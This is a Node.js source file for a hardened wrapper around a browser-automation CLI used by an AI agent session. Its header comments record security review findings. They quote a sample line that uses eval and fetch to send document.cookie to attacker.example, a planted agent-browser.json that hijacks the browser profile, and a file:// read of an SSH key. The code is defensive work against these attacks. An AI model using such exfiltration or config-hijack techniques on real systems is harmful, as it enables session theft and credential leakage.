#!/usr/bin/env node
// _agent-browser-safe.mjs — hardened agent-browser wrapper, reached via
// `maude design agent-browser-safe <subcommand> [args...]` (DDR-062 dispatch;
// DDR-185 security addendum, round 3).
//
// WHY THIS EXISTS: DDR-185 originally added a bare `Bash(agent-browser:*)`
// allow-list entry so the ACP session wouldn't prompt on the raw
// `agent-browser eval`/`agent-browser screenshot` calls already documented in
// `plugins/design/agents/motion-critic.md` and `plugins/design/commands/edit.md`.
// A security review (ethical-hacker Finding D) found that grant was a
// zero-confirmation, zero-click session-hijack primitive: `agent-browser`'s
// OWN bundled onboarding skill (`plugins/flow/skills/agent-browser/SKILL.md`)
// recommends a PERSISTENT Chrome profile as the default auth strategy for
// real, cross-origin authenticated sites (GitHub, production, ClickUp).
//
// ROUND 3 — a live adversarial re-check of round 2 found TWO further real
// bypasses, both live-confirmed against the real `agent-browser` binary:
//
//   1. **`eval` defeats `--allowed-domains` entirely — a navigation gate is
//      not a network-egress firewall.** `--allowed-domains` only restricts
//      `agent-browser open <url>` (a top-level navigation). It installs NO
//      in-page network policy. Any JS handed to `eval` runs with none of
//      that restriction: `eval "window.location.href='https://real-site'"`
//      simply navigates around the gate (live-confirmed: a subsequent `get
//      url` showed the escaped origin), and even without navigating,
//      `eval "fetch('https://attacker.example/c?d='+document.cookie,
//      {mode:'no-cors'})"` beacons out directly — a no-cors fetch is
//      confirmed to actually leave the machine (`type:'opaque'`,
//      `status:0`) with no read-back needed to exfiltrate. There is no
//      argv-level fix for this: `eval` IS arbitrary JS execution in page
//      context, and network reach is inherent to that, not a separate flag
//      to strip. Mirrors this DDR's own `find` precedent exactly ("neither
//      residual is fixable via prefix-matching... cut it, don't patch it")
//      — **`eval` is REMOVED from `ALLOWED_SUBCOMMANDS`.** The two
//      documented call sites that used it (`motion-critic.md`, `edit.md`)
//      revert to raw `agent-browser eval` — which still prompts for
//      confirmation, exactly like every OTHER un-listed command. This is
//      the pre-DDR-185 status quo for those two specific calls, not a new
//      regression.
//   2. **`./agent-browser.json` project-config auto-discovery bypassed
//      EVERY CLI-flag and env-var protection in round 1/2, with ZERO flags
//      or env vars touched at all.** agent-browser's own `--help`
//      documents a 4-tier config precedence: `~/.agent-browser/config.json`
//      → **`./agent-browser.json` (project-level, discovered from CWD)** →
//      env vars → CLI flags. The ACP session's `cwd` is `repoRoot` — the
//      DDR-054 UNTRUSTED project root. Live-confirmed: a plain
//      `agent-browser.json` file (`{"profile":"./hijacked-profile"}`)
//      committed at repo root is auto-discovered and honored on the very
//      next `agent-browser-safe` call, with no model complicity needed at
//      all — the file alone does the work. This is a confused-deputy
//      primitive round 1/2 never considered (they only modeled CLI
//      flags/env vars as the attack surface). **Fixed**: `--config
//      <Maude-owned-empty-file>` is now forced on every spawn — per
//      agent-browser's own docs, `--config <path>` REPLACES the entire
//      default discovery chain (both the user-level AND project-level
//      files) with the one file named, so `./agent-browser.json` is never
//      read. `AGENT_BROWSER_CONFIG` also added to `CLEARED_ENV_KEYS`
//      (defense in depth against an ambient env override of the config
//      path itself).
//
// The wrapper's own effectiveness is now verified two ways, not one: an
// argv-parsing unit-test suite (`_agent-browser-safe.test.mjs`), AND this
// file's own comments record the LIVE runtime behavior each fix was
// confirmed against — the round-2 verification pass's own finding was that
// round 1 was validated only at the argv layer, never against what the real
// binary's OWN config/transport surface actually does.
//
// ROUND 2 (superseded in shape, kept for the record): the first hardening
// pass allowlisted the subcommand but only REJECTED a specific list of
// known-dangerous flags in the remaining argv. A follow-up found the
// env-clearing list was a strict subset of the flag reject-list, and a
// further `--help` read surfaced `-p`/`--provider <name>` (routes the
// session through a remote cloud browser) which was never in the reject
// list at all. Both were instances of the same root problem `_curl-local.mjs`
// diagnoses: enumerating "known-dangerous flags" against a third-party
// CLI's evolving surface is an unbounded chase. Fixed by replacing the flag
// reject-list with a FIXED positional-argument arity per subcommand — ANY
// additional argv token beyond that arity, flag-shaped or not, is rejected.
// There is no flag concept left for the caller to reach at all, so
// `--provider`/`-p`, or any future CLI flag neither review round thought to
// name, cannot recur here by construction.
//
//   1. The subcommand (argv[0], REQUIRED to be first) must be one of:
//      open/screenshot/snapshot/get/wait/close. Nothing that reads
//      cookies/clipboard/storage, executes arbitrary JS, attaches to an
//      already-running Chrome, routes through a remote provider,
//      uploads/downloads files, or spawns the `chat` sub-agent is reachable
//      through this wrapper at all.
//   2. The remaining argv must match that subcommand's fixed arity exactly
//      — no more, no fewer.
//   3. The real `agent-browser` child is spawned with `--allowed-domains
//      localhost,127.0.0.1` AND `--config <empty-file>` forced (the latter
//      closing the project-config discovery chain per round 3, finding 2),
//      AND every profile/session/policy/proxy/engine/config env var
//      agent-browser's own `--help` documents explicitly cleared before
//      spawning — regardless of what the user's own `~/.claude/settings.json`
//      or shell rc ambiently sets (DDR-144's `settingSources:['user']`
//      legitimately still reads those for the user's own manual terminal
//      use; this wrapper's env deletion is what stops that from leaking
//      into the auto-approving ACP session specifically).
//
// Exit: agent-browser's own exit code on success · 2 usage/rejected argv ·
//       1 other (failed to spawn agent-browser at all).

import { spawnSync } from 'node:child_process';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { urlRefusal } from './_url-guard.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
// A fixed, empty, valid-JSON config file this wrapper always points
// agent-browser at — per agent-browser's own docs, `--config <path>`
// REPLACES its entire default discovery chain (user-level AND
// project-level `./agent-browser.json`) with the one file named, so a
// project-root config file (DDR-054 untrusted content) can never be
// auto-discovered. Must stay valid JSON — agent-browser exits with an
// error if `--config` points to a missing/invalid file.
const EMPTY_CONFIG_PATH = join(HERE, '_agent-browser-safe-config.json');

// [minArgs, maxArgs] positional arguments AFTER the subcommand itself.
// `eval` is deliberately NOT here — see the round-3 header comment: it
// grants arbitrary JS execution (inherently including network/navigation
// reach) that no argv-level check can constrain.
export const SUBCOMMAND_ARITY = Object.freeze({
  open: [1, 1],
  screenshot: [0, 1],
  snapshot: [0, 0],
  get: [1, 2],
  wait: [1, 1],
  close: [0, 0],
});

export const ALLOWED_SUBCOMMANDS = Object.freeze(Object.keys(SUBCOMMAND_ARITY));

// Env vars agent-browser's own `--help` documents as controlling
// profile/session/policy/proxy/engine/config behavior — every one of them
// is an env-var equivalent of a capability this wrapper's subcommand/arity
// model already refuses to let the caller reach via a flag, so none of them
// may leak through from the ambient environment either. Cleared (deleted,
// not empty-string — agent-browser validates an explicit empty session name
// as invalid rather than unset).
export const CLEARED_ENV_KEYS = Object.freeze([
  'AGENT_BROWSER_PROFILE',
  'AGENT_BROWSER_SESSION_NAME',
  'AGENT_BROWSER_ACTION_POLICY',
  'AGENT_BROWSER_CONFIRM_ACTIONS',
  'AGENT_BROWSER_CONFIRM_INTERACTIVE',
  'AGENT_BROWSER_AUTO_CONNECT',
  'AGENT_BROWSER_ENGINE',
  'AGENT_BROWSER_CONFIG',
  'AGENT_BROWSER_PROXY',
  'HTTP_PROXY',
  'HTTPS_PROXY',
  'ALL_PROXY',
  'http_proxy',
  'https_proxy',
  'all_proxy',
]);

const NO_EGRESS_WEBRTC = '--force-webrtc-ip-handling-policy=disable_non_proxied_udp';

/**
 * The env agent-browser runs with: every policy/proxy key above cleared, the localhost-only domain
 * list, and — V2-8.9 re-check 2 H-b (decision maude/v2-p8-agent-browser-safe-no-egress) — with
 * MAUDE_NO_EGRESS=1 ("Search the web" off) the same dead-proxy rule _no-egress.sh gives the shell
 * helpers, set AFTER the clearing: a dead loopback proxy for everything that is not loopback, no
 * bypass lists, WebRTC limited to proxied (= no) UDP, and a session of its own. --allowed-domains
 * alone never stopped in-page navigation, a meta refresh or an <img> to a website.
 */
export function safeEnv(base = process.env) {
  const env = { ...base };
  for (const key of CLEARED_ENV_KEYS) delete env[key];
  env.AGENT_BROWSER_ALLOWED_DOMAINS = 'localhost,127.0.0.1';
  if (env.MAUDE_NO_EGRESS === '1') {
    env.AGENT_BROWSER_PROXY = 'http://127.0.0.1:9';
    for (const k of ['AGENT_BROWSER_PROXY_BYPASS', 'NO_PROXY', 'no_proxy']) delete env[k];
    const args = (env.AGENT_BROWSER_ARGS ?? '').split(',').filter(Boolean);
    if (!args.includes(NO_EGRESS_WEBRTC)) args.push(NO_EGRESS_WEBRTC);
    env.AGENT_BROWSER_ARGS = args.join(',');
    const session = env.AGENT_BROWSER_SESSION || 'default';
    env.AGENT_BROWSER_SESSION = session.endsWith('-noegress') ? session : `${session}-noegress`;
  }
  return env;
}

/** Returns a block-reason string if this argv should be refused, else null. */
export function validateArgv(argv) {
  const sub = argv[0];
  if (!sub || !ALLOWED_SUBCOMMANDS.includes(sub)) {
    return `subcommand "${sub ?? ''}" is not on the allow-list (${ALLOWED_SUBCOMMANDS.join(', ')}) — no global flags are permitted before the subcommand`;
  }
  const rest = argv.slice(1);
  const [min, max] = SUBCOMMAND_ARITY[sub];
  if (rest.length < min || rest.length > max) {
    const expected = min === max ? `exactly ${min}` : `${min}-${max}`;
    return `"${sub}" takes ${expected} argument(s), got ${rest.length} — no flags of any kind are accepted here (agent-browser-safe has no flag vocabulary at all; see --help)`;
  }
  // V2-8.9 B2 — `--allowed-domains` names hosts, so it never stopped `file://` (no host at all):
  // `open file:///…/.ssh/id_ed25519` + `get text body` read any file. Only http(s) to this Mac.
  // (`screenshot <path>` is confined to the project / temp dir by the dispatcher, cli design.mjs.)
  if (sub === 'open') {
    const why = urlRefusal(rest[0]);
    if (why) return why;
  }
  return null;
}

const HELP = `agent-browser-safe — hardened agent-browser wrapper (reached via \`maude design agent-browser-safe\`)

Usage:
  maude design agent-browser-safe <subcommand> [args...]

Allowed subcommands (fixed argument count, NO flags of any kind):
  open <url>               snapshot                 wait <sel|ms>
  screenshot [path]         get <thing> [selector]    close

NOTE: "eval" is intentionally NOT supported — it grants arbitrary JS
execution with network/navigation reach no argv check can constrain. Use
raw \`agent-browser eval\` (which will prompt for confirmation) instead.

Forces --allowed-domains localhost,127.0.0.1 and --config <empty file>
(blocking project-level agent-browser.json auto-discovery), regardless of
any ambient AGENT_BROWSER_*/*_PROXY environment.

Exit: agent-browser's own exit code · 2 usage/rejected argv · 1 other.`;

function main() {
  const argv = process.argv.slice(2);
  if (argv.length === 0 || argv[0] === '--help' || argv[0] === '-h') {
    process.stdout.write(`${HELP}\n`);
    process.exit(argv.length === 0 ? 2 : 0);
  }
  const blockReason = validateArgv(argv);
  if (blockReason) {
    process.stderr.write(`agent-browser-safe: ${blockReason}\n`);
    process.exit(2);
  }
  const [sub, ...rest] = argv;
  const env = safeEnv(process.env);
  const result = spawnSync(
    'agent-browser',
    ['--config', EMPTY_CONFIG_PATH, sub, ...rest, '--allowed-domains', 'localhost,127.0.0.1'],
    { stdio: 'inherit', env }
  );
  if (result.error) {
    process.stderr.write(
      `agent-browser-safe: failed to run agent-browser: ${result.error.message}\n`
    );
    process.exit(1);
  }
  process.exit(result.status ?? 1);
}

// Run only when invoked directly (not when imported by the test). This shim
// runs under real `node` on a real on-disk path (never embedded in
// `bun --compile`), so the classic argv[1] guard is correct here — see the
// v0.38.0 self-heal memory.
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main();
}
